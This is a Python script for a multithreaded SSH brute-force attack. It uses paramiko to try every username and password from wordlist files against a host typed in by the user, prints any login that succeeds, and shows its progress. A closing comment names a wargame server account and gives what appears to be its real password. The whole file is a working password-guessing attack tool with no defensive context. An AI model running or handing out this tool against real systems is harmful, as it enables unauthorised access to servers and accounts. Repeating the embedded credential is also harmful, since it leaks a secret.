import paramiko
from threading import Thread
import time
import argparse
import sys
import random


THREAD_NUM = 10

class Client():
    def __init__(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    def connect(self, host, user, secret, port):
        try:
            self.client.connect(hostname=host, username=user, password=secret, port=port)
            return 1
        except paramiko.ssh_exception.AuthenticationException:
            return 0
        except ConnectionError:
            print('ConnectionError:(')
    def close(self):
        self.client.close()

class BruteThread(Thread):
    def __init__(self, passwords, users, host, port):
        Thread.__init__(self)
        self.passwords = passwords
        self.client = Client()
        self.users = users
        self.host = host
        self.port = port
    def run(self):
        self.done = False
        self.count = 0
        for user in self.users:
            for password in self.passwords:
                if self.done:
                    return 0
                con = self.client.connect(self.host, user, password, self.port)
                if con:
                    print(user+':'+password)
                    self.done = True
                self.count += 1
                self.client.close()

def getData(file_names):
    data = {'users':[],'passwords':[]} 
    for data_k in data.keys():
        with open(file_names[data_k],'r') as file:
            data[data_k] = file.read().split('\n')
            file.close()
    return data

def startThreads(data, host, port):
    threads = []
    for i in range(THREAD_NUM):
        thread_dict = data['passwords'][i::THREAD_NUM]
        threads.append(BruteThread(thread_dict, data['users'], host, port))
        threads[i].start()
    return threads

def cmd_arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--pasword_file', default='passwords.txt')
    parser.add_argument('-l', '--login_file', default='users.txt')
    return parser


parser = cmd_arg_parser()
namespace = parser.parse_args(sys.argv[1:])
pasword_file = namespace.pasword_file
login_file = namespace.login_file

file_names = {'users':login_file, 'passwords':pasword_file}

host = input("host: ")
port = int(input("port: "))
data = getData(file_names)
threads = startThreads(data, host, port)


Done = False
all_count = len(data['users']) * len(data['passwords'])
sumary = 0
while not Done:
    for i in range(THREAD_NUM):
        if threads[i].done:
           Done = True
        sumary += threads[i].count
    print(str(sumary)+'/'+str(all_count),str(int(sumary / all_count * 100))+'%')
    if sumary == all_count:
        Done = True
        print("Не нашлось.")
    sumary = 0
    time.sleep(10)
    
for i in range(THREAD_NUM):
    threads[i].done = True

'''
test:
level5@io.netgarage.org
DNLM3Vu0mZfX0pDd
'''
        
        
           
   
    
